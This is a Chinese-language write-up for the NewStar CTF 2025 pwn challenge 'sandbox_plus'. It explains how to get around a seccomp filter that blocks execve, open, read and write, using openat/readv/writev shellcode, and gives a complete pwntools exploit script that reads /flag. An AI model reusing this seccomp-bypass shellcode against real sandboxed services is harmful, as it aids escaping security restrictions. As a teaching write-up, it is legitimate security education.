---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# sandbox_plus

![程序主逻辑](/assets/images/wp/2025/week3/sandbox-plus_1.jpg)

这道题目还是考查 `shellcode`，但是在执行之前会先经过一个 `install_seccomp` 函数，我们去看看函数内容。

![seccomp 沙箱安装函数](/assets/images/wp/2025/week3/sandbox-plus_2.jpg)

可以看到程序加载了 seccomp 沙箱。可以通过 `seccomp-tools dump 文件地址` 快速查看沙箱规则。沙箱规则通常分为白名单和黑名单：白名单表示仅允许指定系统调用，黑名单表示禁止指定系统调用。

可以看到程序禁用了 `execve`、`execveat`、`open`、`read`、`write`、`sendfile`，当程序发现系统调用号和上面五个函数的系统调用号相同时，会直接结束进程。

![seccomp-tools 查看沙箱规则](/assets/images/wp/2025/week3/sandbox-plus_3.jpg)

因此需要绕过沙箱读取 FLAG。这里考虑通过 `openat` 打开 `/flag` 文件，随后通过 `readv` 和 `writev` 将内容输出到终端。

```c
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
```

在 `openat` 函数中，第一个参数传入 `-100`，第二个参数传入 `"/flag"` 的地址即可打开 FLAG 文件。

调用 `openat` 的 shellcode 可以写为：

```asm
mov rdi, -100
mov rsi, 0x67616c662f
push rsi
mov rsi, rsp
mov rdx, 0
mov rax, 257
syscall
```

`readv` 和 `writev` 依赖 `iov` 结构体，该结构体如下：

```c
struct iovec {
    void  *iov_base;  // 缓冲区起始地址
    size_t iov_len;   // 缓冲区长度（字节数）
};
```

因此需要先构建该结构体，随后将结构体地址设置为 `readv` 和 `writev` 的第二个参数。函数的第三个参数是 `iov` 数组中的元素数量，可以设置为 1。

可以将结构体布置在栈上。执行上面的 `openat` shellcode 后，`rsi` 中保留了栈地址，因此可以通过 `rsi` 指定 `readv` 读入地址和 `writev` 写出地址。shellcode 如下：

```asm
add rsi, 8
push 0x500
push rsi
// readv
mov rsi, rsp
mov rdi, 3
mov rdx, 1
mov rax, 19
syscall

// writev
mov rdi, 1
mov rax, 20
syscall
```

因此可以得到 EXP：

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")

io = remote("127.0.0.1", 11337)
# io = process("attachment/pwn")
shell = """
// openat
mov rdi, -100
mov rsi, 0x67616c662f
push rsi
mov rsi, rsp
mov rdx, 0
mov rax, 257
syscall

// readv
add rsi, 8
push 0x500
push rsi
mov rsi, rsp
mov rdi, 3
mov rdx, 1
mov rax, 19
syscall

// writev
mov rdi, 1
mov rax, 20
syscall
"""
# shell = shellcraft.sh()
shell = asm(shell)
# gdb.attach(io)
# pause()

print(shell)
io.send(shell)

io.interactive()
```
